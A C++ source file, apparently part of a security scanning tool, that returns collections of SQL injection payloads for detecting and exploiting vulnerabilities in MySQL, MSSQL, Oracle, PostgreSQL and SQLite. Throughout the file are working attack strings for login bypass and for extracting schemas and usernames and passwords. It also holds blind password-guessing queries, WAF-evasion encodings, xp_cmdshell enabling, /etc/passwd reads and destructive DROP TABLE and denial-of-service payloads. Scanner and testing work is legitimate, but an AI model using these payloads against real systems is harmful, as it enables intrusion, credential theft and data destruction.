/**
 * SqlInjectionPayloads.cpp
 * Implementación de payloads para detección y explotación de vulnerabilidades de inyección SQL
 */

#include "SqlInjectionPayloads.h"
#include <vector>
#include <string>

namespace BlackWidow {
namespace Security {
namespace Payloads {

std::vector<std::string> SqlInjectionPayloads::getBasicPayloads() {
    return {
        // Payloads básicos para detección
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "\" OR \"1\"=\"1",
        "\" OR \"1\"=\"1\" --",
        "OR 1=1",
        "OR 1=1 --",
        "' OR 'a'='a",
        "; OR '1'='1'",
        "admin' --",
        "admin' #",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT 1,2,3,4,5 --"
    };
}

std::vector<std::string> SqlInjectionPayloads::getAdvancedPayloads() {
    return {
        // Payloads avanzados
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(table_name,'::',column_name) FROM information_schema.columns WHERE table_schema=DATABASE() --",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
        "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1) --",
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(table_name,'::',column_name),0x3a,FLOOR(RAND()*2)) FROM information_schema.columns GROUP BY a) --",
        "' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(6765=6765,1))),0x7176766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
    };
}

std::vector<std::string> SqlInjectionPayloads::getDatabaseSpecificPayloads(DatabaseType dbType) {
    switch(dbType) {
        case DatabaseType::MYSQL:
            return {
                // MySQL specific payloads
                "' OR 1=1 -- -",
                "' UNION SELECT @@version, NULL #",
                "' UNION SELECT table_name,column_name FROM information_schema.columns #",
                "' AND SLEEP(5) #",
                "' AND IF(1=1, SLEEP(5), 0) #",
                "' PROCEDURE ANALYSE() #",
                "' LOAD_FILE('/etc/passwd') #"
            };
        case DatabaseType::MSSQL:
            return {
                // MSSQL specific payloads
                "' OR 1=1 --",
                "'; WAITFOR DELAY '0:0:5' --",
                "'; EXEC xp_cmdshell 'ping 127.0.0.1' --",
                "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
                "'; SELECT @@version --",
                "'; SELECT name FROM master..sysdatabases --",
                "'; SELECT name FROM master..syslogins --"
            };
        case DatabaseType::ORACLE:
            return {
                // Oracle specific payloads
                "' OR 1=1 --",
                "' UNION SELECT banner FROM v$version --",
                "' UNION SELECT table_name FROM all_tables --",
                "' UNION SELECT column_name FROM all_tab_columns --",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --",
                "' AND UTL_INADDR.GET_HOST_ADDRESS('google.com') --",
                "' AND UTL_HTTP.REQUEST('http://google.com') --"
            };
        case DatabaseType::POSTGRESQL:
            return {
                // PostgreSQL specific payloads
                "' OR 1=1 --",
                "' UNION SELECT version() --",
                "' UNION SELECT table_name FROM information_schema.tables --",
                "' UNION SELECT column_name FROM information_schema.columns --",
                "' AND (SELECT pg_sleep(5)) --",
                "' AND (SELECT current_database()) --",
                "' AND (SELECT current_user) --"
            };
        case DatabaseType::SQLITE:
            return {
                // SQLite specific payloads
                "' OR 1=1 --",
                "' UNION SELECT sqlite_version() --",
                "' UNION SELECT name FROM sqlite_master WHERE type='table' --",
                "' UNION SELECT sql FROM sqlite_master --",
                "' AND 1=randomblob(500000000) --",
                "' AND 1=like('ABCDEFG',upper(hex(randomblob(500000000)))) --",
                "' AND 1=unicode('ABCDEFG',upper(hex(randomblob(500000000)))) --"
            };
        default:
            return getBasicPayloads();
    }
}

std::vector<std::string> SqlInjectionPayloads::getDataExtractionPayloads(DatabaseType dbType) {
    switch(dbType) {
        case DatabaseType::MYSQL:
            return {
                // MySQL data extraction
                "' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema=DATABASE() --",
                "' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=DATABASE() --",
                "' UNION SELECT CONCAT(table_schema,'.',table_name) FROM information_schema.tables --",
                "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --",
                "' UNION SELECT GROUP_CONCAT(username,':',password) FROM users --"
            };
        case DatabaseType::MSSQL:
            return {
                // MSSQL data extraction
                "' UNION SELECT name FROM sysobjects WHERE xtype='U' --",
                "' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users') --",
                "' UNION SELECT CONCAT(name,':',master.dbo.fn_varbintohexstr(password)) FROM sysusers --",
                "' UNION SELECT DB_NAME() --",
                "' UNION SELECT STRING_AGG(name, ',') FROM sys.tables --"
            };
        default:
            return {
                // Generic data extraction
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
                "' ORDER BY 10 --",
                "' GROUP BY 1,2,3,4,5 --",
                "' UNION SELECT @@version --"
            };
    }
}

std::vector<std::string> SqlInjectionPayloads::getWafBypassPayloads() {
    return {
        // WAF bypass techniques
        "/*!50000 SELECT */ 1",
        "/*!50000 UNION */ /*!50000 SELECT */ 1",
        "/*!12345UNION SELECT*/0x31,0x32,0x33",
        "'+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+1,2,3--+",
        "'%09UNION%09SELECT%091,2,3--",
        "'%0AUNION%0ASELECT%0A1,2,3--",
        "'%0CUNION%0CSELECT%0C1,2,3--",
        "'%0DUNION%0DSELECT%0D1,2,3--",
        "'%0AUNION%A0SELECT%A01,2,3--",
        "'%20UNION%20SELECT%20NULL,NULL,NULL--",
        "'%23%0AUNION%23%0ASELECT%23%0A1,2,3--",
        "'%23%0AUNION%23foo%0ASELECT%23%0A1,2,3--",
        "'%23xxx%0AUNION%23xxx%0ASELECT%23%0A1,2,3--",
        "'/**/UNION/**/SELECT/**/1,2,3--",
        "' UN/**/ION SEL/**/ECT 1,2,3--",
        "' UNI%00ON SEL%00ECT 1,2,3--",
        "' /*!50000UnION*/ /*!50000SeLeCt*/ 1,2,3--"
    };
}

std::vector<std::string> SqlInjectionPayloads::getContextSpecificPayloads(SqlContext context) {
    switch(context) {
        case SqlContext::STRING_LITERAL:
            return {
                "' OR '1'='1",
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1",
                "\" OR \"1\"=\"1\" --",
                "' OR 'x'='x",
                "\" OR \"x\"=\"x""
            };
        case SqlContext::NUMERIC_CONTEXT:
            return {
                "1 OR 1=1",
                "1) OR (1=1",
                "1 AND 1=1",
                "1 AND 1=0--",
                "1 AND 1=0 UNION SELECT 1,2,3--",
                "1) UNION SELECT 1,2,3--"
            };
        case SqlContext::IDENTIFIER:
            return {
                "users; DROP TABLE users--",
                "users; SELECT * FROM information_schema.tables--",
                "users/**/WHERE/**/1=1",
                "users UNION SELECT 1,2,3--",
                "users.passwords",
                "users.id WHERE 1=1"
            };
        case SqlContext::COMMENT:
            return {
                "*/; SELECT * FROM users; /*",
                "*/ UNION SELECT 1,2,3; /*",
                "*/ OR 1=1; /*",
                "*/ DROP TABLE users; /*",
                "*/ INSERT INTO users VALUES('hacker','hacker'); /*"
            };
        case SqlContext::PROCEDURE_CALL:
            return {
                "EXEC('SELECT * FROM users')",
                "EXEC('SELECT * FROM users WHERE username=''admin'' AND password='''+@password+'''')",
                "EXEC sp_executesql N'SELECT * FROM users'",
                "EXEC xp_cmdshell 'net user'",
                "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --"
            };
        default:
            return getBasicPayloads();
    }
}

std::vector<std::string> SqlInjectionPayloads::getBlindInjectionPayloads(DatabaseType dbType) {
    switch(dbType) {
        case DatabaseType::MYSQL:
            return {
                // MySQL blind injection
                "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --",
                "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>90 --",
                "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5) --",
                "' AND IF((SELECT password FROM users WHERE username='admin' LIMIT 0,1)='admin', SLEEP(5), 0) --",
                "' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') --"
            };
        case DatabaseType::MSSQL:
            return {
                // MSSQL blind injection
                "' AND SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1)='a' --",
                "' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1))>90 --",
                "' AND (SELECT TOP 1 LEN(password) FROM users WHERE username='admin')>5 --",
                "' IF (SELECT password FROM users WHERE username='admin')='admin' WAITFOR DELAY '0:0:5' --",
                "' IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>90) WAITFOR DELAY '0:0:5' --"
            };
        default:
            return {
                // Generic blind injection
                "' AND 1=1 --",
                "' AND 1=2 --",
                "' AND 1=1 AND 'a'='a",
                "' AND 1=2 AND 'a'='a",
                "' AND SUBSTR(@@version,1,1)='5' --",
                "' AND LENGTH(database())>5 --"
            };
    }
}

} // namespace Payloads
} // namespace Security
} // namespace BlackWidow